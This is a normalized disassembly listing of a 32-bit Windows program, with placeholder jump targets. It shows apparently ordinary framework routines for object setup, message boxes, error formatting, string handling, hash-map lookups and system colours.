mov [ esi + 0x144 ] edi
mov [ esi + 0x148 ] edi
mov [ esi + 0x14c ] edi
mov [ esi + 0x150 ] edi
mov [ esi + 0x154 ] edi
mov [ esi + 0x158 ] edi
mov [ esi + 0x15c ] edi
mov [ esi + 0x160 ] edi
mov [ esi + 0x164 ] edi
mov [ esi + 0x168 ] edi
mov [ esi + 0x16c ] edi
mov [ esi + 0x170 ] edi
mov [ esi + 0x174 ] edi
mov [ esi + 0x178 ] edi
mov [ esi + 0x17c ] edi
mov [ esi + 0x180 ] edi
mov [ esi + 0x184 ] edi
mov eax esi
call sub_415c98
retn
sub_40b9c0
push 0x4
mov eax sub_425b08
call sub_415bc0
mov esi ecx
push r--data
lea ecx [ ebp - 0x10 ]
call sub_40b758
lea eax [ ebp - 0x10 ]
xor edi edi
push eax
mov ecx esi
mov [ ebp - 0x4 ] edi
call sub_40b593
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffff0
call sub_40b038
mov [ esi ] r--data
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x58 ] edi
mov [ esi + 0x5c ] edi
mov [ esi + 0x60 ] edi
mov eax esi
call sub_415c98
retn
sub_40ba43
push 0x4
mov eax sub_425b08
call sub_415bc0
mov esi ecx
push r--data
lea ecx [ ebp - 0x10 ]
call sub_40b758
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
call sub_40b593
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffff0
call sub_40b038
mov [ esi ] r--data
and [ esi + 0x10 ] 0x0
mov eax esi
call sub_415c98
retn
sub_40ba8a
push 0xc
mov eax sub_425b54
call sub_415bf3
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
xor edi edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
lea ebx [ esi + 0x34 ]
mov ecx ebx
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
call sub_40b45e
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
or [ esi + 0x50 ] 0xffffffff
mov [ ebp - 0x4 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x68 ] edi
mov [ esi + 0x6c ] edi
mov al [ ebp + 0x8 ]
push 0x1000
mov ecx ebx
mov [ esi + 0x28 ] 0x20
mov [ esi + 0x20 ] 0x14
mov [ esi + 0x18 ] edi
mov [ esi + 0x14 ] al
mov [ ebp - 0x4 ] 0x2
call sub_40b495
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
jmp sub_40bb1f
sub_40bb1f
push 0xc
mov [ esi + 0x30 ] ebx
mov [ esi + 0x44 ] 0x18
call sub_40a5cc
mov [ esi + 0x78 ] eax
mov [ esp ] 0x188
call sub_40a8fc
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] 0x4
cmp ecx edi
je r-xdata
xor eax eax
call sub_40b79c
jmp r-xdata
xor eax eax
call sub_40b9c0
jmp r-xdata
mov ecx [ esi + 0x78 ]
push 0x64
mov [ ebp - 0x4 ] bl
mov [ ecx ] eax
call sub_40a8fc
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] 0x5
cmp ecx edi
je r-xdata
xor eax eax
call sub_40ba43
jmp r-xdata
mov ecx [ esi + 0x78 ]
push 0x14
mov [ ebp - 0x4 ] bl
mov [ ecx + 0x4 ] eax
call sub_40a8fc
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] 0x6
cmp ecx edi
je r-xdata
mov ecx [ esi + 0x78 ]
mov [ ecx + 0x8 ] eax
mov [ esi + 0x7c ] ebx
mov [ esi + 0x80 ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0x88 ] edi
mov eax esi
call sub_415c98
retn 0x4
sub_40bbdb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40b4dc
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a919
sub_40bbfb
push 0x4
mov eax sub_425b78
call sub_415bc0
push 0x8c
call sub_40a8fc
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ecx eax
je r-xdata
call sub_415c98
retn
call sub_40bbc5
sub_40bc2a
push sub_40a7f9
mov ecx rw-data
call sub_40ada8
test eax eax
jne r-xdata
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
jmp sub_40a7dd
retn
push sub_40bbfb
mov ecx rw-data
call sub_40a981
test eax eax
je r-xdata
sub_40bc76
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40bc2a
cmp [ eax + 0x7c ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x80 ]
cmp eax 0xffffffff
je r-xdata
push esi
push eax
call sub_40af27
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40bcba
push 0x14
push r--data
call sub_415ff4
xor ebx ebx
mov [ ebp - 0x20 ] ebx
lea eax [ ebp - 0x20 ]
push eax
call sub_40bc2a
push [ eax + 0x80 ]
call sub_40af55
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] ebx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ MessageBoxW@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bd1c
mov eax [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
call sub_416039
retn
sub_40bd1c
cmp [ ebp - 0x24 ] 0x2
je r-xdata
retn
xor eax eax
cmp [ ebp - 0x1c ] ebx
sete al
mov esi eax
cmp esi ebx
je r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push edi
call [ SetLastError@IAT ]
push [ ebp - 0x20 ]
push ebx
call sub_40af3e
cmp esi ebx
je r-xdata
sub_40bd64
mov edi edi
push ebp
mov ebp esp
push esi
call sub_40bd51
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x128 ]
test eax eax
je r-xdata
lea eax [ esi + 0x80 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ eax ]
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x64 ]
sub_40bd9d
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ GetParent@IAT ]
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
jne r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongW@IAT ]
test eax 0x40000000
je r-xdata
call sub_40bcae
test eax eax
jne r-xdata
mov edi esi
mov eax esi
test esi esi
je r-xdata
push esi
call ebx
mov esi eax
mov esi [ eax + 0x20 ]
jmp r-xdata
call sub_40bd51
test eax eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push eax
mov edi eax
call ebx
test eax eax
jne r-xdata
test esi esi
jne r-xdata
xor esi esi
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
test esi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
test edi edi
je r-xdata
push esi
call [ GetLastActivePopup@IAT ]
mov esi eax
and [ ebx ] 0x0
push edi
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push 0x0
push edi
mov [ ebx ] edi
call [ EnableWindow@IAT ]
jmp r-xdata
sub_40be3d
mov edi edi
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push esi
mov [ ebp - 0x220 ] eax
call sub_40bd64
pop ecx
lea eax [ ebp - 0x210 ]
push eax
push esi
call sub_40bd9d
mov ebx eax
mov [ ebp - 0x21c ] ebx
cmp ebx [ ebp - 0x210 ]
je r-xdata
and [ ebp - 0x218 ] esi
lea eax [ ebp - 0x218 ]
push eax
push ebx
call [ GetWindowThreadProcessId@IAT ]
test ebx ebx
je r-xdata
push 0x1
push ebx
call [ EnableWindow@IAT ]
test edi edi
je r-xdata
call [ GetCurrentProcessId@IAT ]
cmp [ ebp - 0x218 ] eax
jne r-xdata
and [ ebp - 0x214 ] 0x0
test esi esi
je r-xdata
lea esi [ edi + 0x78 ]
push 0x0
push 0x0
push 0x376
push ebx
call [ SendMessageW@IAT ]
test eax eax
je r-xdata
test [ ebp + 0x10 ] 0xf0
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0x214 ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x20c ] ax
test edi edi
je r-xdata
mov eax [ ebp + 0x10 ]
and eax 0xf
cmp eax 0x1
jbe r-xdata
add eax 0x30000
mov [ esi ] eax
lea ebx [ ebp - 0x20c ]
mov edi 0x104
push edi
mov eax ebx
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
cmp eax edi
jne r-xdata
mov ebx [ edi + 0x50 ]
jmp r-xdata
or [ ebp + 0x10 ] 0x30
add eax 0xfffffffd
cmp eax 0x1
ja r-xdata
push [ ebp + 0x10 ]
push ebx
push [ ebp - 0x220 ]
push [ ebp - 0x21c ]
call sub_40bcba
add esp 0x10
mov edi eax
test esi esi
je r-xdata
xor eax eax
mov [ ebp - 0x6 ] ax
or [ ebp + 0x10 ] 0x20
jmp r-xdata
cmp [ ebp - 0x210 ] 0x0
je r-xdata
mov eax [ ebp - 0x214 ]
mov [ esi ] eax
push 0x1
call sub_40bd64
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
push 0x1
push [ ebp - 0x210 ]
call [ EnableWindow@IAT ]
sub_40bfa2
mov edi edi
push ebp
mov ebp esp
call sub_40bc2a
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
call sub_40be3d
add esp 0x10
pop ebp
retn 0xc
mov edx [ eax ]
mov ecx eax
pop ebp
jmp [ edx + 0x98 ]
sub_40bfd5
push 0x4
mov eax sub_425b08
call sub_415bc0
lea ecx [ ebp - 0x10 ]
call sub_40b45e
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_40b6c0
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
push esi
call sub_40bfa2
lea ecx [ esi - 0x10 ]
mov edi eax
call sub_40b038
mov eax edi
call sub_415c98
retn 0xc
mov eax [ ebp + 0x8 ]
sub_40c024
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4153e7
push eax
call sub_40a828
add esp 0x14
pop ebp
retn
sub_40c05a
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
test ebx ebx
je r-xdata
call sub_40a7dd
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
call sub_40bc2a
mov eax [ eax + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_40b006
pop ecx
pop ecx
test eax eax
jne r-xdata
push edi
movzx edi [ eax ]
lea ecx [ esi - 0x1 ]
cmp ecx edi
jae r-xdata
mov [ ebx ] ax
lea esi [ edi + edi ]
push esi
add eax 0x2
push eax
lea eax [ ecx + ecx ]
push eax
push ebx
call sub_40c024
add esp 0x10
xor eax eax
mov [ esi + ebx ] ax
mov eax edi
pop edi
jmp r-xdata
mov edi ecx
pop esi
pop ebx
pop ebp
retn 0xc
sub_40c0cd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
cmp eax 0xffffffff
jne r-xdata
push eax
mov ecx esi
call sub_40b0b3
pop esi
pop ebp
retn 0x4
mov eax [ esi ]
push [ eax - 0x8 ]
push eax
call sub_40c045
pop ecx
pop ecx
sub_40c115
push 0x4
mov eax sub_425cbe
call sub_415bc0
push 0xc
call sub_40a5cc
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ecx eax
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax + 0x8 ] ecx
mov [ ebp + 0x8 ] eax
push r--data
lea eax [ ebp + 0x8 ]
push eax
call sub_415cca
int3
call sub_40c0fd
sub_40c158
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
xor edx edx
cmp eax edx
je r-xdata
push edx
push edx
lea eax [ ebp + 0x10 ]
push eax
push 0x800
push [ ecx + 0x8 ]
push edx
push 0x1100
call [ FormatMessageW@IAT ]
test eax eax
jne r-xdata
mov [ eax ] edx
push 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a854
add esp 0x10
push [ ebp + 0x10 ]
call [ LocalFree@IAT ]
xor eax eax
inc eax
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ax
jmp r-xdata
pop ebp
retn 0xc
sub_40c1b1
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_40c1d3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi ]
mov esi [ eax - 0xc ]
lea ebx [ esi + 0x1 ]
push ebx
call sub_40b495
mov cx [ ebp + 0x8 ]
mov [ eax + esi * 2 ] cx
push ebx
mov ecx edi
call sub_40b0b3
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_40c202
mov edi edi
push ebp
mov ebp esp
movsx ax [ ebp + 0x8 ]
movzx eax ax
push esi
push eax
mov esi ecx
call sub_40c1d3
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40c21f
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
sub esi eax
sar esi 0x1
push edi
mov edi [ eax - 0xc ]
mov [ ebp - 0x4 ] ecx
test ebx ebx
jge r-xdata
push [ ebp + 0x8 ]
call sub_40b09e
cmp ebx eax
pop ecx
jle r-xdata
push 0x80070057
call sub_40aa1e
mov eax 0x7fffffff
sub eax ebx
cmp eax edi
jl r-xdata
mov ebx eax
mov ecx [ ebp - 0x4 ]
lea eax [ edi + ebx ]
push eax
mov [ ebp + 0xc ] eax
call sub_40b495
cmp esi edi
lea esi [ eax + esi * 2 ]
jbe r-xdata
push ebx
push esi
lea eax [ eax + edi * 2 ]
push ebx
push eax
call sub_40b07d
mov ecx [ ebp - 0x4 ]
add esp 0x10
push [ ebp + 0xc ]
call sub_40b0b3
pop edi
pop esi
pop ebx
leave
retn 0x8
mov esi [ ebp + 0x8 ]
sub_40c29c
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b09e
pop ecx
push eax
push [ ebp + 0x8 ]
mov ecx esi
call sub_40c21f
pop esi
pop ebp
retn 0x4
sub_40c2eb
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push 0x11
pop edi
cmp [ ebp + 0xc ] 0x0
je r-xdata
push eax
call sub_40a5fb
and [ esi + 0x4 ] 0x0
pop ecx
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebp
retn 0x8
xor ecx ecx
push 0x4
pop edx
mov eax edi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_40a5cc
mov ecx edi
shl ecx 0x2
push ecx
push 0x0
push eax
mov [ esi + 0x4 ] eax
call sub_415f60
add esp 0x10
sub_40c349
mov edi edi
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x14 ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
call sub_40cc4b
and [ esi + 0x14 ] 0x0
pop esi
retn
push eax
call sub_40a5fb
and [ esi + 0x4 ] 0x0
pop ecx
sub_40c394
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
shr eax 0x4
mov [ edx ] eax
xor edx edx
div [ ecx + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx + edx * 4 ]
jmp r-xdata
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] esi
je r-xdata
pop esi
pop ebp
retn 0xc
mov eax [ eax ]
sub_40c3cf
mov edi edi
push ebp
mov ebp esp
test ecx ecx
jne r-xdata
push esi
mov esi [ ecx + 0x4 ]
test esi esi
jne r-xdata
call sub_40a7dd
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
xor edx edx
shr eax 0x4
div [ ecx + 0x8 ]
mov edx [ esi + edx * 4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
test edx edx
jne r-xdata
pop esi
pop ebp
retn 0x4
cmp [ edx + 0x4 ] edi
je r-xdata
xor eax eax
mov eax [ edx + 0x8 ]
jmp r-xdata
mov edx [ edx ]
pop edi
sub_40c414
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_40c394
test eax eax
je r-xdata
leave
retn 0x8
mov eax [ eax + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
sub_40c43d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ecx + 0x4 ]
test esi esi
jne r-xdata
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
shr eax 0x4
xor edx edx
div [ ecx + 0x8 ]
lea edx [ esi + edx * 4 ]
mov eax [ edx ]
jmp r-xdata
xor eax eax
jmp r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn 0x4
cmp [ eax + 0x4 ] edi
je r-xdata
pop edi
mov esi [ eax ]
push eax
mov [ edx ] esi
call sub_40c376
xor eax eax
inc eax
jmp r-xdata
mov edx eax
mov eax [ eax ]
sub_40c485
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi [ eax ]
test esi esi
je r-xdata
pop esi
pop ebp
retn 0xc
push edi
cmp esi 0xffffffff
jne r-xdata
mov edi [ esi ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x8 ]
xor edi edi
test edx edx
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ ecx ] eax
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
pop edi
mov eax [ esi + 0x4 ]
shr eax 0x4
xor edx edx
push ebx
mov ebx [ ecx + 0x8 ]
div ebx
inc edx
cmp edx ebx
jae r-xdata
mov eax [ ecx + 0x4 ]
pop ebx
mov eax [ ecx + 0x4 ]
lea eax [ eax + edx * 4 ]
inc edi
add eax 0x4
cmp edi edx
jb r-xdata
inc edx
add eax 0x4
cmp edx ebx
jb r-xdata
mov esi [ eax ]
test esi esi
jne r-xdata
call sub_40a7dd
mov edi [ eax ]
test edi edi
jne r-xdata
sub_40c508
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
cmp ecx edx
mov [ eax ] r--data
jg r-xdata
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] 0x11
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov [ eax + 0x18 ] ecx
pop ebp
retn 0x4
push 0xa
pop ecx
sub_40c546
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
inc [ esi + 0xc ]
mov [ esi + 0x10 ] ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
pop esi
retn
push 0xc
push [ esi + 0x18 ]
lea eax [ esi + 0x14 ]
push eax
call sub_40cc18
mov ecx [ esi + 0x18 ]
mov edx ecx
imul edx edx 0xc
add eax 0x4
dec ecx
lea eax [ eax + edx - 0xc ]
js r-xdata
mov edx [ esi + 0x10 ]
mov [ eax ] edx
mov [ esi + 0x10 ] eax
dec ecx
sub eax 0xc
test ecx ecx
jge r-xdata
sub_40c596
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
mov esi ecx
call sub_40c394
test eax eax
jne r-xdata
pop edi
add eax 0x8
pop esi
leave
retn 0x4
cmp [ esi + 0x4 ] eax
jne r-xdata
mov ecx esi
call sub_40c546
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edi
mov edx [ esi + 0x4 ]
shl ecx 0x2
mov edx [ ecx + edx ]
mov [ eax ] edx
mov edx [ esi + 0x4 ]
mov [ ecx + edx ] eax
push 0x1
push [ esi + 0x8 ]
mov ecx esi
call sub_40c2eb
sub_40c5ed
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40c349
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_40c61a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
test esi esi
jge r-xdata
lea eax [ esi + 0x1 ]
imul eax [ ebp + 0xc ]
add eax 0x10
push eax
call sub_415170
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
and [ eax + 0x4 ] 0x0
mov [ eax ] edi
mov [ eax + 0xc ] 0x1
mov [ eax + 0x8 ] esi
pop edi
pop esi
pop ebp
retn 0x8
sub_40c66b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
jge r-xdata
lea eax [ esi + 0x1 ]
imul eax [ ebp + 0x10 ]
add eax 0x10
push eax
push [ ebp + 0x8 ]
call sub_4162f5
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax + 0x8 ] esi
pop esi
pop ebp
retn 0xc
sub_40c6d1
mov edi edi
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
push edi
xor edi edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
call sub_40cc4b
mov [ esi + 0x14 ] edi
pop edi
pop esi
retn
sub_40c6f3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
call sub_40a7dd
pop ebp
retn 0x4
call sub_40c6d1
sub_40c71a
test ecx ecx
jne r-xdata
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
call sub_40a7dd
mov eax [ edx ]
push esi
mov esi [ edx + 0x8 ]
mov [ ecx + 0x4 ] eax
test eax eax
je r-xdata
and [ ecx + 0x8 ] 0x0
and [ eax + 0x4 ] 0x0
jmp r-xdata
push edx
call sub_40c6f3
mov eax esi
pop esi
retn
sub_40c754
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x4 ]
cmp eax 0x1
jne r-xdata
cmp eax 0xf
jne r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
push 0x0
push [ ecx ]
call [ ValidateRect@IAT ]
pop ebp
retn 0x8
sub_40c7b6
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
mov eax [ ebx ]
push esi
call [ eax + 0x44 ]
test eax eax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebx ]
push edi
mov ecx ebx
call [ eax + 0x38 ]
mov edi eax
mov eax [ esi ]
cmp [ r--data ] eax
jne r-xdata
mov edx [ edi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ r--data ]
jne r-xdata
mov ecx [ edx ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ r--data ]
jne r-xdata
mov eax [ esi ]
cmp [ ecx ] eax
jne r-xdata
mov edi [ edi ]
test edi edi
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ r--data ]
jne r-xdata
add edx 0x8
mov eax [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
xor eax eax
mov ecx [ edi + 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ ecx + 0x8 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
cmp [ ecx ] edx
jne r-xdata
mov eax [ ecx + 0xc ]
cmp eax [ esi + 0xc ]
jne r-xdata
mov eax [ ecx + 0x4 ]
add eax ebx
cmp [ eax ] edx
jne r-xdata
mov edi [ edi ]
cmp edi edx
jne r-xdata
mov eax [ edx + 0x4 ]
add eax ebx
cmp [ eax ] 0x0
jne r-xdata
pop edi
add ecx 0x8
jmp r-xdata
sub_40c869
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
push esi
push edi
mov [ ebp - 0x8 ] ecx
call [ eax + 0x38 ]
mov edi eax
cmp [ eax ] 0x0
jne r-xdata
add eax 0x8
lea esi [ eax + 0x4 ]
jmp r-xdata
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + eax ]
test eax eax
je r-xdata
mov edi [ edi ]
test edi edi
jne r-xdata
add esi 0x8
mov ecx [ eax ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x4 ]
push edx
push [ ebp + 0x8 ]
push eax
call [ ecx ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn 0x4
sub_40c8cb
mov edi edi
push ebp
mov ebp esp
push 0x10
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416510
add esp 0xc
neg eax
sbb eax eax
inc eax
pop ebp
retn
sub_40c912
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov esi ecx
lea eax [ esi + 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
push [ esi + 0x1c ]
lea ecx [ ebp - 0x14 ]
call sub_40bc76
mov eax [ esi ]
and [ ebp - 0x4 ] ebx
mov ecx esi
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] ebx
je r-xdata
call sub_415c98
retn
push [ ebp - 0x14 ]
push ebx
call sub_40af3e
sub_40c97d
mov edi edi
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0x8 ]
mov edi ecx
call sub_40c7b6
mov esi [ ebp + 0xc ]
mov [ esi ] eax
mov ecx edi
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_40c869
mov [ esi ] eax
neg eax
sbb eax eax
and eax 0x7fffbffe
add eax 0x80004002
call sub_40c8f7
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
sub_40c9c0
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x8 ] 0x0
je r-xdata
pop ebp
jmp sub_40c97d
push [ ebp + 0xc ]
mov eax [ ecx + 0x8 ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx ]
pop ebp
retn 0x8
sub_40c9e3
mov edi edi
push esi
push edi
mov edi [ GetSysColor@IAT ]
push 0xf
mov esi ecx
call edi
push 0x10
mov [ esi + 0x28 ] eax
call edi
push 0x14
mov [ esi + 0x2c ] eax
call edi
push 0x12
mov [ esi + 0x30 ] eax
call edi
push 0x6
mov [ esi + 0x34 ] eax
call edi
mov edi [ GetSysColorBrush@IAT ]
push 0xf
mov [ esi + 0x38 ] eax
call edi
push 0x6
mov [ esi + 0x24 ] eax
call edi
pop edi
mov [ esi + 0x20 ] eax
pop esi
retn
sub_40ca29
mov edi edi
push ebx
push esi
